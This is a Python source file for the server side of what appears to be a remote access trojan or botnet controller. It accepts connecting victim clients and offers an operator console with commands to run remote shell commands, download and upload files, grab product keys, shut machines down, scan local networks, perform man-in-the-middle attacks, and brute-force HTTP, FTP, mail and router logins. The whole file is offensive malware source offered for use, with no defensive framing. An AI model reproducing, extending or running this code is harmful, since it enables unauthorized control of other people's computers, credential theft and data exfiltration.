from config.__config__ import * 
class bindings():
	class Exceptions(Exception):
		pass 
	class utils():
		def show_ferror(exceptive, throw):
			codes = ["0", "1", "100"]
			if exceptive in codes:
				if exceptive == codes[0]:
					raise Exceptions("Wrong version provided, entered '%s'"%(throw,))
				elif exceptive == codes[1]:
					raise bindings.Exceptions("Non-exist version provided, required *, ipv4, ipv6 - but not '%s'"%(throw,))
				elif exceptive == codes[2]:
					raise bindings.Exceptions("Socket-lib based error! Type: %s"%(throw,))
		def create_sock(inet):
			import socket
			if inet == "ipv4":
				return socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
			else:
				return socket.socket(socket.AF_INET6, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
		def sock_pre(addr):
			if listen_addr.accept ==  "*":
				if ":" in addr:
					sock = bindings.utils.create_sock(inet="ipv6")
				else:
					sock = bindings.utils.create_sock(inet="ipv4")
			elif listen_addr.accept == "ipv4" and not "ipv6":
				if ":" in addr:
					bindings.utils.show_ferror(exceptive="0", throw="ipv6")
				else:
					sock  = bindings.utils.create_sock(inet="ipv4")
			elif listen_addr.accept == "ipv6" and not "ipv4":
				if ":" in addr:
					sock = bindings.utils.create_sock(inet="ipv4")
				else:
					bindings.utils.show_ferror(exceptive="0", throw="ipv4")
			else:
				bindings.utils.show_ferror(exceptive="1", throw=listen_addr.accept)
			return sock
	def test_bind(ip, port):
		sock = bindings.utils.sock_pre(addr=ip)
		try:
			sock.bind((ip, port))
			return True
		except Exception as failure:
			bindings.utils.show_ferror(exceptiove="100", throw=failure)
			return False
	def real_bind(ip, port, cipher, bcipher, silent, max_clients, socket):
		global clients
		clients = []
		global client_ip
		client_ip = []	
		global closed 
		closed = []
		def __actual__():
			socket.bind((ip, port))
			socket.listen(5)
			class utilize():
				def console(**kwargs):
					def __actuals__():
						while True:
							cli = input("imnoob> ")
							if cli == "test" and not None:
								print("* Test packet sent!  to all %d clients* "%(len(clients)))
								for criminals in clients:
									criminals.send("test\x0A".encode("utf-8"))
									at_least = criminals.recv(124812).decode("utf-8")
									if "received!" in at_least:
										print("* Command executed! * ")
							elif cli == "showclosed" and not None:
								print('''
Total closed: %d
+---------------+
Closed: 
%s'''%(len(closed),closed))
							elif cli == "showusers" and not None:
								print(" * * Total users online: %d *  * "%(len(client_ip)))
							elif cli == "showips" and not None:
								for protoc in client_ip:
									print(protoc + "\n")
							elif "close" in cli and not None:
								bob = cli.split(" ")
								for client in client_ip:
									if bob[1] in client:
										lias = True
								if lias == True:
									for ipis in clients:
										if bob[1] and bob[2] in str(ipis):
											closed.append(ipis)
											clients.remove(ipis)
											ipis.close()
											break
									print("* Host is in black hosts! * ")
							elif cli == "help" and not None:
								print('''
help        : Shows this menu.
test        : Send a test packet!
showusers   : Shows all online users.
showclosed  : Show all closed sessions.
showips     : Shows all internet protocols connected.
getinfo     : Usage: getinfo ip port # Gets information about PC.
getprod     : Usage: getprod ip port # Gets product key.
exec        : Usage: exec command ip port # Execute command on the actual terminal.
close       : Usage: close ip port 
showfiles   : Usage: showfiles ip port 
download    : Usage: download ip port file
upload      : Usage: upload ip port file
sysshut     : Usage: sysshut ip port message
router      : Usage: router ip port list   # Brute forces the gateway of the target"s router. [GET]
accesses    : Usage: access ip port # Checks if there is a clear access to directories.
scanloc     : Usage: scanlog ip port 255# Checks what local hosts are alive
showiface   : Usage: showiface ip port # Enumerates ifaces of the actual system
getlocmac   : Usage: getlocmac ip port # Enumerates local address mac address.
mitm        : Usage: mitm ip port iface
brute-http  : Usage: brute-http <ip> <port> <host> <rport> <username> <plist> <userform> <passwordform> <authdir> <errormsg>
brute-ftp   : Usage: brute-ftp <ip> <port> <host> <rport> <username> <plist>
brute-mail  : Usage: brute-mail <ip> <port> <host> <rport> <email> <plist> 
rerunprcs   : Usage: rerunprcs <ip> <port> <name> # It drops on other process, basically just run as specific call, E.G if it is executable will be name.exe, or python object name.py ''')
							elif "getinfo" in cli and not None:
								act = cli.split(" ")
								if len(act) > 1:
									for actually in client_ip:
										if act[1] in actually:
											print("* Address found! * ")
											lia = True
									for lias in clients:
										if act[1] and act[2] in str(lias):
											lias.send("allinfo".encode("utf-8")) 
											info = lias.recv(124812).decode("utf-8")
											if len(info) > 0 and info != 0:
												print("* Command executed * !")
											else:
												print("* Command failed! * ")
											print('''
Information about %s 
%s'''%(act[1], info))
								else:
									print("* No arguments specified! * ")
							elif "getprod" in cli and not None:
								act = cli.split(" ")
								if len(act) > 1:
									for addresses in client_ip:
										if act[1] in addresses:
											print("* Address found! * ")
											lia = True
									if "all" in act[1]:
										lia = False
									if lia == True and not False:
										for contents in clients:
											if act[1] and act[2] in str(contents):
												contents.send("getprod".encode("utf-8"))
												dats = contents.recv(124812).decode("utf-8")
												if len(dats) > 0 and not 0:
													print("* Command executed successfully * ")
												print('''
Information about %s
%s'''%(act[1], dats))
									else:
										rcvs = []
										for octs in clients:
											octs.send("getprod".encode("utf-8"))
											bob = rcvs.append(octs.recv(1241).decode("utf-8"))
										for contents in rcvs:
											print(contents)
							elif "exec" in cli and not None:
								acts = cli.split(" ")
								if len(acts) > 1:
									for addresses in client_ip:
										if acts[2] in addresses:
											lias = True
									if "all" in acts[2]:
										lias = "Addresses"
								#print(acts)
								if lias == True and not False:
									for sockets in clients:
										if acts[2] and acts[3] in str(sockets):
											sockets.send(f"exec:{acts[1]}".encode("utf-8"))
											liax = True
								rcvs = []
								if lias == "Addresses":
									for sockets in clients:
										sockets.send(f"exec:{acts[1]}".encode("utf-8"))
										pop = sockets.recv(12481).decode("utf-8")
										rcvs.append(pop)
										lias = True
								bad = sockets.recv(124812).decode()
								if lias == True and not False:
									print('''
Information about %s
Command output: %s'''%(acts[2], bad))
								else:
									for cls in rcvs:
										print(cls + "\x0A")
									#print("* Requested address is not found! * ")
							elif "showfiles" in cli and not None:
								actie = cli.split(" ")
								if len(actie) > 1:
									for anre in client_ip:
										if actie[1] in anre:
											lias = True
								if lias == True and not False:
									for brixie in clients:
										if actie[1] and actie[2] in str(brixie):
											brixie.send("showfiles".encode("utf-8"))
								out = brixie.recv(12481).decode("utf-8")
								if len(out) > 0:
									print("* Command executed successfully! * ")
								print('''
Information about %s
%s'''%(actie[1], out))
							elif "download" in cli and not None:
								acto = cli.split(" ")
								if len(acto) > 1:
									for act in client_ip:
										if acto[1] in act:
											lias = True
								if lias == True:
									for sockets in clients:
										if acto[1] and acto[2] in str(sockets):
											sockets.send(f"download:{acto[3]}".encode("utf-8"))
								fil_cont = []
								pop = sockets.recv(124812).decode("utf-8")
								if len(pop) > 1:
									print("* File received! * ")
									fil_cont.append(pop)
									with open(acto[3] + ".rcv", "a") as file:
										file.write(fil_cont[0])
							elif "sysshut" in cli and not None:
								accto  = cli.split(" ")
								if len(accto) >1:
									for acts in client_ip:
										if accto[1] in acts:
											lias = True
								if lias == True and not False:
									for socket_env in clients:
										if accto[1] and accto[2] in str(socket_env):
											socket_env.send(f"shutdown:{accto[3]}".encode("utf-8"))
									if "shot" in str(socket_env):
										print("* Shutdown siege completed! * ")
									else:
										print("* Shutdown siege failure! Trying with the OS way . .*")
										rcv = socket_env.recv(124811).decode("utf-8")
										if "compl" in rcv:
											print("* PC is turned off! * ")
							elif "upload" in cli and not None:
								accts = cli.split(" ")
								if len(accts) > 1:
									for bibx in client_ip:
										if accts[1] in bibx:
											lias=  True
								if lias == True and not False:
									for socks in clients:
										if accts[1] and accts[2] in str(socks):
											socks.send(f"upload;test".encode("utf-8"))
									pop3 = socks.recv(14219).decode()
									#print(pop3)
									if "data" in pop3:
										with open(accts[3], "rb") as file:
											socks.send(b"".join(exe for exe in file))
								probe = socks.recv(124812).decode()
								print('''
Information about %s
%s'''%(accts[1], probe))
							elif "accesses" in cli and not None:
								acco = cli.split(" ")
								if len(acco) > 1:
									for protoc in client_ip:
										if acco[1] in protoc:
											lias = True
								if lias == True and not False:
									for sockie in clients:
										if acco[1] and acco[2] in str(sockie):
											sockie.send("checkac".encode("utf-8"))
								recv = sockie.recv(12412).decode("utf-8")
								#print(recv)
								if len(recv) > 1:
									print("* Command executed successfully! * ")
									print('''
Information about %s
Directories allowed: 
%s'''%(acco[1], recv))
							elif "scanloc" in cli and not None:
								accto = cli.split(" ")
								if len(accto) > 1:
									for protocs in client_ip:
										if accto[1] in protocs:
											lias = True
								if lias == True:
									def wait_thread(socket,addr):
										from threading import Thread
										def ths():
											ans = socket.recv(12412).decode("utf-8")
											if len(ans) > 1:
												print("* Command executed successfully!")
												print('''
Information about %s
%s'''%(addr, ans + "\x0A"))
										for io in range(1):
											selfish = Thread(target=ths)
											selfish.start()
									for octs in clients:
										if accto[1] and accto[2] in str(octs):
											octs.send(f"scanloc:{accto[3]}".encode("utf-8"))
									print("* Scan started * ")
									#wait_thread(socket=octs, addr=accto[1])
							elif "showiface" in cli and not None:
								accto = cli.split(" ")
								if len(accto) > 1:
									for protocs in client_ip:
										if accto[1] in protocs:
											lias = True
								if lias == True:
									for gg in clients:
										if accto[1] and accto[2] in str(gg):
											gg.send("enumiface".encode("utf-8"))
								ans = gg.recv(18421).decode("utf-8")
								if len(ans) > 1:
									print("* Command executed successfully! * ")
									print('''
Information about %s 
%s'''%(accto[1], ans))
							elif "brute-http" in cli and not None:
								accts = cli.split(" ")
								if len(accts) > 2:
									for protcs in client_ip:
										if accts[1] in protcs:
											lias = True
								if lias == True:
									class brt():
										def brute(socket):
											def selfish():
												bia = socket.recv(214812).decode("utf-8")
												print('''
Status: %s'''%(bia,))
											from threading import Thread
											for compt10 in range(1):
												t = Thread(target=selfish)
												t.start()
									for octets in clients:
										#print(accts)
										octets.send(f"brute-http:{accts[3]}:{accts[4]}:{accts[5]}:{accts[7]}:{accts[8]}:{accts[9]}:{accts[10]}".encode("utf-8"))
									chance = octets.recv(124812).decode("utf-8")
									if "wordlist" in chance:
										#print("12312312"
										with open(accts[6], "r", encoding="latin-1") as file:
											cont = "\x0A".join(xor.strip() for xor in file)
											octets.send(cont.encode("utf-8"))
									har =octets.recv(124821).decode("utf-8")
									if "done" in har:
										print("* Brute Force Initialised * ")
										brt = brt.brute(socket=octets)
							elif "brute-ftp" in cli and not None:
								ols = cli.split(" ")
								if len(ols) > 2:
									for ios in client_ip:
										if ols[1] in ios:
											lias = True
									class recvs():
										def thread(socket):
											def __actual__():
												ans = socket.recv(14814).decode("utf-8")
												print(ans)
											from threading import Thread
											for ssx in range(1):
												ts = Thread(target=__actual__)
												ts.start()
									for countable in clients:
										if ols[1] and ols[2] in str(countable):
											countable.send(f"brute-ftp:{ols[3]}:{ols[4]}:{ols[5]}".encode("utf-8"))
									bite = countable.recv(124812).decode("utf-8")
									if "wordlist" in bite:
										with open(ols[6], "r") as file:
											olx = "\n".join(xia.strip() for xia in file)
											countable.send(olx.encode("utf-8"))
									print("* Brute Force initialised *")
									receiveg = recvs.thread(socket=countable)
							elif "getlocmac" in cli and not None:
								olie = cli.split(" ")
								for clin in client_ip:
									if olie[1] in clin:
										lias = True
								for clienx in clients:
									if olie[1] and olie[2] in str(clienx):
										clienx.send("g3tmac".encode("utf-8"))
								alls = clienx.recv(148124).decode("utf-8")
								if len(alls) > 0:
									print("* Command executed! * ")
									print(alls)
							elif "rerunprcs" in cli and not None:
								olies = cli.split(" ")
								for clin in client_ip:
									if olies[1] in clin:
										lias = True
								other = []
								if lias == True and not False or other:
									for cs in clients:
										if olies[1] and olies[2] in str(cs):
											try:
												cs.send(f"changeproc:{olies[3]}".encode("utf-8"))
											except:
												for pieces in clients:
													if olies[1] in str(pieces):
														print("* IP(%s) is removed since it is dead, and packets cannot be sent! * "%(olies[1]))
														clients.remove(pieces)
														#break 
								print("* Process renamed and rerunned! Port is now other, since client connected again! Old process is still active!".encode("utf-8"))
							elif "brute-mail" in cli and not None:
								class but():
									def need(sock):
										def sexy():
											bob = sock.recv(124812).decode("utf-8").strip()
											print(bob)
										from threading import Thread
										for cr in range(1):
											tos = Thread(target=sexy)
											tos.start()
								olies = cli.split(" ")
								for klins in client_ip:
									if olies[1] in klins:
										lias = True
								if lias == True:
									for cols in clients:
										if olies[1] and olies[2] in str(cols):
											cols.send(f"brute-mail:{olies[3]}:{olies[4]}:{olies[5]}".encode("utf-8"))
								nes = cols.recv(12418).decode("utf-8")
								if "wordlist" in nes:
									with open(olies[6]) as file:
										bob = "\x0A".join(lo.strip() for lo in file)
										cols.send(bob.encode("utf-8"))
								print("* Brute Force started * ")
								th = but.need(sock=cols)
					from threading import Thread
					for ios in range(1):
						tosie = Thread(target=__actuals__)
						tosie.start()
			import datetime
			from win32api import SetConsoleTitle
			while True:
				cl_inet, cl_addr = socket.accept()
				SetConsoleTitle("Clients: %s" %(len(clients)))
				objects = datetime.datetime.now()
				calculate = str(objects.hour) + ":" + str(objects.minute) + ":" + str(objects.second)
				api_ = cl_inet.recv(14812).decode("utf-8")
				if "ffalsxoa;lasodfpafoa9&!^#!@&!*#@!(#&AS" in api_:
					with open("log.g", "a") as file:
						file.write("[%s] Is grabbed [API-GRANTED]"%(calculate) + "\x0A")
						cl_inet.send("significant".encode("utf-8"))
						ans = cl_inet.recv(124281).decode("utf-8")
						file.write("[%s] Information %s "%(calculate, ans))
						clients.append(cl_inet)
						client_ip.append(cl_addr[0] + ":" + str(cl_addr[1]))
						utilize.console(actuals=clients, ips=client_ip)
				else:
					with open("log.g", "a") as file:
						file.write("[%s] is not grabbed [API-DENIED]"%(caluclate) + "\x0A")
						closed.append(cl_inet)
						cl_inet.close()
		from threading import Thread
		for ios in range(1):
			tos = Thread(target=__actual__)
			tos.start()
def __main__(**kwargs):
	print("* Preparing to bind as %s:%s * "%(kwargs.get("ip"), kwargs.get("port")))
	sec_flaws = bindings.test_bind(ip=kwargs.get("ip"), port=4098)
	if sec_flaws == True and sec_flaws != False:
		print("+" + 10*"-"*5 + "+")
		print("* Binding as %s:%s *"%(kwargs.get("ip"), kwargs.get("port")))
		print("+" + 10*"-"*5 + "+")
		bindings.real_bind(ip=kwargs.get("ip"), port=kwargs.get("port"), cipher=kwargs.get('encryption'), bcipher=kwargs.get("exencryption"), silent=kwargs.get("silent"), max_clients=kwargs.get("max_clients"), socket=bindings.utils.sock_pre(addr=kwargs.get("ip")))
lists = __main__(ip=listen_addr._ip_, port=listen_addr._port_, encryption=handlers.encr, exencryption=handlers.exencr, silent=handlers.silent, max_clients=handlers.max_clients)